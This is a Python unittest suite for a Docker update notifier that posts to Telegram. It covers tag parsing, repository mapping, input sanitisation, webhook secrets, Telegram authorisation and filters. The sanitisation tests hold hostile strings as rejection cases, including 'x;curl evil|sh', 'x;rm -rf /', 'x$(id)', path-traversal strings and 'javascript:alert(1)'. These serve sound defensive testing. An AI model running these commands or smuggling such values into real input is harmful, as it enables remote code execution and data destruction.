"""Extended test suite for the modular DiunTap.

Covers legacy behaviour (parsing, mappings, formatter, i18n) plus the audit
fixes: input sanitisation, Telegram De Morgan auth, webhook secret, opaque
action store (no tag truncation), path-traversal guard, payload validation
and bounded dedup cache.
"""

import asyncio
import json
import os
import tempfile
import unittest
from pathlib import Path

os.environ["LANGUAGE"] = "en"
os.environ["LOCAL_NODE_NAME"] = "TestNode"

from dedup import DedupCache
from filters import match_excluded_image, match_pinned_target, normalize_patterns
from i18n import t
from mappings import DEFAULT_IMAGE_TO_GITHUB, load_custom_mappings, resolve_github_repo
from models import ActionStore, DiunWebhookPayload, parse_image_and_tag, parse_legacy_callback
from security import (
    guard_stack_path,
    is_telegram_user_allowed,
    sanitize_service_name,
    sanitize_stack_name,
    sanitize_tag,
    validate_github_repo,
    verify_webhook_secret,
)


class TestParsing(unittest.TestCase):
    def test_parse_image_and_tag(self):
        img, tag = parse_image_and_tag("docker.io/deluan/navidrome:v0.55.0")
        self.assertEqual(img, "deluan/navidrome")
        self.assertEqual(tag, "v0.55.0")

        img, tag = parse_image_and_tag("vaultwarden/server:latest")
        self.assertEqual(img, "vaultwarden/server")
        self.assertEqual(tag, "latest")

        img, tag = parse_image_and_tag("ghcr.io/gethomepage/homepage:latest@sha256:12345")
        self.assertEqual(img, "ghcr.io/gethomepage/homepage")
        self.assertEqual(tag, "latest")

        img, tag = parse_image_and_tag("library/ubuntu:22.04")
        self.assertEqual(img, "ubuntu")
        self.assertEqual(tag, "22.04")

        img, tag = parse_image_and_tag("local-registry.lan:5000/myteam/app:v1.2")
        self.assertEqual(img, "local-registry.lan:5000/myteam/app")
        self.assertEqual(tag, "v1.2")

        img, tag = parse_image_and_tag("local-registry.lan:5000/app:latest@sha256:abcdef")
        self.assertEqual(img, "local-registry.lan:5000/app")
        self.assertEqual(tag, "latest")

        img, tag = parse_image_and_tag("alpine")
        self.assertEqual(img, "alpine")
        self.assertEqual(tag, "latest")

    def test_full_tag_preserved_no_truncation(self):
        # Regression: legacy tag[:14] broke tags like v1.2.3-alpine / long semver.
        img, tag = parse_image_and_tag("myorg/app:v1.2.3-alpine")
        self.assertEqual(tag, "v1.2.3-alpine")
        self.assertEqual(sanitize_tag(tag), "v1.2.3-alpine")

        long_tag = "v" + "1" * 100
        self.assertEqual(sanitize_tag(long_tag), long_tag)


class TestMappingsResolution(unittest.TestCase):
    def test_builtin_and_heuristics(self):
        repo = resolve_github_repo("deluan/navidrome", DEFAULT_IMAGE_TO_GITHUB)
        self.assertEqual(repo, "navidrome/navidrome")

        repo2 = resolve_github_repo("docker.io/jellyfin/jellyfin", DEFAULT_IMAGE_TO_GITHUB)
        self.assertEqual(repo2, "jellyfin/jellyfin")

        repo3 = resolve_github_repo("someuser/awesomeapp", DEFAULT_IMAGE_TO_GITHUB)
        self.assertEqual(repo3, "someuser/awesomeapp")

        self.assertIsNone(resolve_github_repo("registry.example.com:5000/a/b/c", {}))

    def test_custom_mappings_file(self):
        with tempfile.NamedTemporaryFile("w+", suffix=".json", delete=False) as f:
            f.write(json.dumps({"custom/app": "customowner/customrepo"}))
            f_path = f.name
        try:
            custom_map = load_custom_mappings(f_path)
            self.assertEqual(custom_map.get("custom/app"), "customowner/customrepo")
            self.assertIn("deluan/navidrome", custom_map)
        finally:
            if os.path.exists(f_path):
                os.remove(f_path)


class TestSecurity(unittest.TestCase):
    def test_sanitize_stack_rejects_injection(self):
        self.assertEqual(sanitize_stack_name("navidrome"), "navidrome")
        for evil in ["../../etc", "a/b", "x;rm -rf /", "x$(id)", "x`id`",
                     "x|y", "x&y", "", "..", "a b", "x\ny"]:
            with self.assertRaises(Exception, msg=evil):
                sanitize_stack_name(evil)

    def test_sanitize_service_rejects_shell(self):
        self.assertEqual(sanitize_service_name("jellyfin.service"), "jellyfin.service")
        for evil in ["x;curl evil|sh", "x&&y", "x$y", "a/b", "x`id`", "x\ny"]:
            with self.assertRaises(Exception, msg=evil):
                sanitize_service_name(evil)

    def test_sanitize_tag_rejects_shell(self):
        self.assertEqual(sanitize_tag("v1.2.3-alpine"), "v1.2.3-alpine")
        for evil in ["x;id", "a/b", "x$y", ""]:
            if evil == "":
                self.assertEqual(sanitize_tag(evil), "latest")
            else:
                with self.assertRaises(Exception, msg=evil):
                    sanitize_tag(evil)

    def test_guard_stack_path_blocks_traversal(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            (base / "ok").mkdir()
            self.assertEqual(guard_stack_path(base, "ok"), (base / "ok").resolve())
            with self.assertRaises(Exception):
                guard_stack_path(base, "../etc")
            with self.assertRaises(Exception):
                guard_stack_path(base, "a/b")

    def test_github_repo_validation(self):
        self.assertEqual(validate_github_repo("jellyfin/jellyfin"), "jellyfin/jellyfin")
        for evil in ["https://evil/x", "a/b/c", "", "a", "a;b", "$(x)/y"]:
            with self.assertRaises(Exception, msg=evil):
                validate_github_repo(evil)

    def test_telegram_auth_demorgan_fix(self):
        allowed = ["111"]
        # Only from_user.id matters now.
        self.assertTrue(is_telegram_user_allowed(111, allowed))
        self.assertTrue(is_telegram_user_allowed("111", allowed))
        # Attacker with spoofed chat but foreign user id -> rejected,
        # even if the chat id equals the allowed id (old OR-logic hole).
        self.assertFalse(is_telegram_user_allowed(999, allowed))
        self.assertFalse(is_telegram_user_allowed(None, allowed))
        self.assertFalse(is_telegram_user_allowed(111, []))

    def test_webhook_secret(self):
        verify_webhook_secret("s3cret", "s3cret")  # no raise
        verify_webhook_secret("", "")  # legacy mode: no raise
        with self.assertRaises(Exception):
            verify_webhook_secret("wrong", "s3cret")
        with self.assertRaises(Exception):
            verify_webhook_secret("", "s3cret")


class TestActions(unittest.TestCase):
    def test_opaque_store_roundtrip_full_tag(self):
        store = ActionStore(ttl_seconds=60)
        aid = store.register("upd", "loc", "navidrome", "v1.2.3-alpine", "hdr")
        action = store.resolve(aid)
        self.assertIsNotNone(action)
        assert action is not None
        self.assertEqual(action.target, "navidrome")
        self.assertEqual(action.tag, "v1.2.3-alpine")  # never truncated
        self.assertIsNone(store.resolve("nonexistent"))

    def test_legacy_callback_parsing(self):
        self.assertEqual(
            parse_legacy_callback("upd:loc:navidrome:v1.0"),
            ("upd", "loc", "navidrome", "v1.0"),
        )
        self.assertEqual(
            parse_legacy_callback("rb:rem:svc:v2")[0:2], ("rb", "rem")
        )
        self.assertIsNone(parse_legacy_callback("hello"))
        self.assertIsNone(parse_legacy_callback(""))


class TestPayload(unittest.TestCase):
    def test_valid_payload(self):
        payload = DiunWebhookPayload(
            image="docker.io/vaultwarden/server:latest",
            status="update",
            hub_link="https://hub.docker.com/r/vaultwarden/server",
        )
        self.assertEqual(payload.image, "docker.io/vaultwarden/server:latest")

    def test_rejects_evil_image(self):
        with self.assertRaises(Exception):
            DiunWebhookPayload(image="x; rm -rf /", status="update")
        with self.assertRaises(Exception):
            DiunWebhookPayload(image="", status="update")

    def test_rejects_non_http_hub_link(self):
        with self.assertRaises(Exception):
            DiunWebhookPayload(image="alpine:3", hub_link="javascript:alert(1)")


class TestDedup(unittest.TestCase):
    def test_duplicate_within_window(self):
        async def go():
            cache = DedupCache(maxsize=8, ttl=60)
            self.assertFalse(await cache.check_and_mark("a"))
            self.assertTrue(await cache.check_and_mark("a"))
            self.assertFalse(await cache.check_and_mark("b"))
        asyncio.run(go())

    def test_bounded_size(self):
        async def go():
            cache = DedupCache(maxsize=4, ttl=60)
            for i in range(10):
                await cache.check_and_mark(f"k{i}")
            self.assertLessEqual(len(cache._cache), 4)
        asyncio.run(go())


class TestFindTargetsLocal(unittest.TestCase):
    def test_filesystem_scan(self):
        from docker_local import _scan_stacks_sync

        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)
            stack1 = tmp_path / "navidrome"
            stack1.mkdir()
            (stack1 / "compose.yaml").write_text(
                "services:\n  navidrome:\n    image: deluan/navidrome:latest\n"
            )
            stack2 = tmp_path / "jellyfin"
            stack2.mkdir()
            (stack2 / "docker-compose.yml").write_text(
                "services:\n  jellyfin:\n    image: jellyfin/jellyfin:10.8.0\n"
            )
            self.assertEqual(
                _scan_stacks_sync(tmp_path, "deluan/navidrome", "navidrome"), "navidrome"
            )
            self.assertEqual(
                _scan_stacks_sync(tmp_path, "jellyfin/jellyfin", "jellyfin"), "jellyfin"
            )
            self.assertIsNone(
                _scan_stacks_sync(tmp_path, "nonexistent/service", "service")
            )

    def test_symlinked_stack_skipped(self):
        from docker_local import _scan_stacks_sync

        with tempfile.TemporaryDirectory() as tmp_dir, tempfile.TemporaryDirectory() as ext_dir:
            tmp_path = Path(tmp_dir)
            # Real content lives OUTSIDE the stacks dir; only a symlink points to it.
            ext = Path(ext_dir) / "real"
            ext.mkdir()
            (ext / "compose.yaml").write_text(
                "services:\n  x:\n    image: evil/img:latest\n"
            )
            link = tmp_path / "linkstack"
            try:
                link.symlink_to(ext, target_is_directory=True)
            except OSError:
                self.skipTest("symlinks not supported")
            self.assertIsNone(_scan_stacks_sync(tmp_path, "evil/img", "img"))


class TestFormatter(unittest.TestCase):
    def test_markdown_formatter(self):
        from formatters import format_markdown_for_telegram

        raw = "## Release 1.0\n* Feature A with [link](https://example.com)\n* **Fix B**"
        formatted = format_markdown_for_telegram(raw)
        self.assertTrue(formatted.startswith("<blockquote expandable>"))
        self.assertTrue(formatted.endswith("</blockquote>"))
        self.assertIn("<b>Release 1.0</b>", formatted)
        self.assertIn('• Feature A with <a href="https://example.com">link</a>', formatted)
        self.assertIn("• <b>Fix B</b>", formatted)


class TestI18n(unittest.TestCase):
    def test_translation_and_parity(self):
        msg = t("title_update")
        self.assertEqual(msg, "🚀 Container Update")

        msg_interp = t("toast_updating", node="HomeServer", name="navidrome")
        self.assertIn("HomeServer", msg_interp)
        self.assertIn("navidrome", msg_interp)

        from i18n import STRINGS

        self.assertEqual(set(STRINGS["en"].keys()), set(STRINGS["pl"].keys()))
        self.assertIn("toast_already_running", STRINGS["en"])
        self.assertIn("toast_already_running", STRINGS["pl"])


class TestFilters(unittest.TestCase):
    def test_normalize_drops_blanks(self):
        self.assertEqual(
            normalize_patterns(["  ", "Vaultwarden/Server ", "", "*/nightly"]),
            ["vaultwarden/server", "*/nightly"],
        )

    def test_exclude_exact_and_short_name(self):
        patterns = normalize_patterns(["vaultwarden/server"])
        self.assertEqual(
            match_excluded_image(
                "docker.io/vaultwarden/server:latest", "vaultwarden/server", patterns
            ),
            "vaultwarden/server",
        )
        # short-name match: pattern without registry hits full refs too
        patterns = normalize_patterns(["navidrome"])
        self.assertEqual(
            match_excluded_image(
                "deluan/navidrome:v0.55.0", "deluan/navidrome", patterns
            ),
            "navidrome",
        )

    def test_exclude_wildcards(self):
        patterns = normalize_patterns(["*:nightly", "ghcr.io/internal/*"])
        self.assertEqual(
            match_excluded_image("myorg/app:nightly", "myorg/app", patterns),
            "*:nightly",
        )
        self.assertEqual(
            match_excluded_image(
                "ghcr.io/internal/portal:1.0", "ghcr.io/internal/portal", patterns
            ),
            "ghcr.io/internal/*",
        )
        self.assertIsNone(
            match_excluded_image("myorg/app:stable", "myorg/app", patterns)
        )

    def test_exclude_case_insensitive(self):
        patterns = normalize_patterns(["Vaultwarden/Server"])
        self.assertEqual(
            match_excluded_image(
                "VAULTWARDEN/SERVER:LATEST", "vaultwarden/server", patterns
            ),
            "vaultwarden/server",
        )

    def test_exclude_no_patterns_never_matches(self):
        self.assertIsNone(match_excluded_image("a/b:1", "a/b", []))

    def test_pinned_exact_local_and_remote(self):
        patterns = normalize_patterns(["postgres", "Vaultwarden"])
        self.assertEqual(match_pinned_target("postgres", None, patterns), "postgres")
        self.assertEqual(
            match_pinned_target(None, "vaultwarden", patterns), "vaultwarden"
        )
        self.assertIsNone(match_pinned_target("navidrome", None, patterns))
        self.assertIsNone(match_pinned_target(None, None, patterns))
        self.assertIsNone(match_pinned_target("postgres", None, []))

    def test_pinned_no_wildcards_partial_does_not_match(self):
        # PINNED_STACKS is exact-match by design (no fnmatch): "post" must
        # not freeze "postgres".
        patterns = normalize_patterns(["post"])
        self.assertIsNone(match_pinned_target("postgres", None, patterns))


if __name__ == "__main__":
    unittest.main()
